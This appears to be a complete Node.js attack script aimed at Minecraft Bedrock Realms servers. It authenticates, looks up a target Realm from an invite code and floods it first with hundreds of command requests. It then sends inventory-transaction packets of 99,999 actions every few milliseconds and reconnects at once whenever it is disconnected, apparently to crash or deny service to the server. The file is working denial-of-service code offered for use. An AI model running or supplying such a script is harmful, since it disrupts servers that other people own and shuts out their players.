const { Authflow, Titles } = require("prismarine-auth");
const { RealmAPI } = require("prismarine-realms");
const { createClient } = require("bedrock-protocol");

// Command spam configuration
let cmd = (message, version, internal) => ({
    command: `/me ${message}`,
    internal,
    version,
    origin: {
        type: internal ? 5 : 0,
        uuid: "0",
        request_id: "0",
    }
});

// Authentication setup
let flow = new Authflow("", "profiles");
let api = RealmAPI.from(flow, "bedrock");
let code = "4xvwttAahqYGsrg"; // Replace with your Realm code/invite

// Main function
async function attackRealm() {
    try {
        // Get realm info
        const realm = code.length < 10 
            ? await api.getRealm(code) 
            : await api.getRealmFromInvite(code);
        
        console.log("Targeting Realm:", realm.id);

        // Phase 1: Command spam
        await executeCommandSpam(realm);
        
        // Phase 2: Inventory transaction spam with auto-reconnect
        await startInventorySpam(realm);
        
    } catch (err) {
        console.error("Initial setup failed:", err);
        setTimeout(attackRealm, 1000); // Retry after 1 second
    }
}

// Phase 1: Command spam
async function executeCommandSpam(realm) {
    return new Promise((resolve) => {
        console.log("Starting command spam phase...");
        
        const client = createClient({
            username: "",
            profilesFolder: "profiles",
            realms: {
                realmId: realm.id
            }
        });

        client.once("play_status", () => {
            console.log("Connected for command spam!");
            
            // Spam commands
            for (let i = 0; i < 400; i++) {
                client.queue('command_request', cmd("test", -i, true));
                client.queue('command_request', cmd("test", i, false));
            }
            
            // Close after spamming
            setTimeout(() => {
                client.close();
                console.log("Command spam phase completed.");
                resolve();
            }, 15);
        });

        client.on('error', (err) => {
            console.error("Command spam error:", err);
            client.close();
            resolve(); // Move to next phase even if error occurs
        });
    });
}

// Phase 2: Inventory transaction spam with auto-reconnect
async function startInventorySpam(realm) {
    let reconnectAttempts = 0;
    
    async function connectAndSpam() {
        reconnectAttempts++;
        
        try {
            console.log(`Connecting for inventory spam (attempt ${reconnectAttempts})...`);
            
            const client = createClient({
                username: "",
                profilesFolder: "profiles",
                realms: {
                    realmId: realm.id
                }
            });

            let intervalId;
            let closed = false;

            client.once("play_status", () => {
                console.log("Connected for inventory spam!");
                reconnectAttempts = 0; // Reset counter on successful connection
                
                intervalId = setInterval(() => {
                    if (closed) return;
                    
                    client.queue("inventory_transaction", {
                        transaction: {
                            legacy: { legacy_request_id: 0 },
                            transaction_type: "normal",
                            actions: new Array(99999).fill({
                                source_type: "container",
                                inventory_id: "inventory",
                                slot: 9,
                                old_item: { network_id: 0 },
                                new_item: { network_id: 0 }
                            })
                        }
                    });
                }, 5); // Adjust delay for spam rate
            });

            client.on("error", (err) => {
                console.error("Inventory spam error:", err);
                if (intervalId) clearInterval(intervalId);
                closed = true;
                setTimeout(connectAndSpam, 1); // Reconnect quickly
            });

            client.on("disconnect", (packet) => {
                console.log("Disconnected:", packet);
                if (intervalId) clearInterval(intervalId);
                closed = true;
                setTimeout(connectAndSpam, 1); // Reconnect quickly
            });
            
        } catch (err) {
            console.error("Connection failed:", err);
            setTimeout(connectAndSpam, 1); // Retry quickly
        }
    }

    // Start the inventory spam phase
    await connectAndSpam();
}

// Start the attack
setTimeout(attackRealm, 1);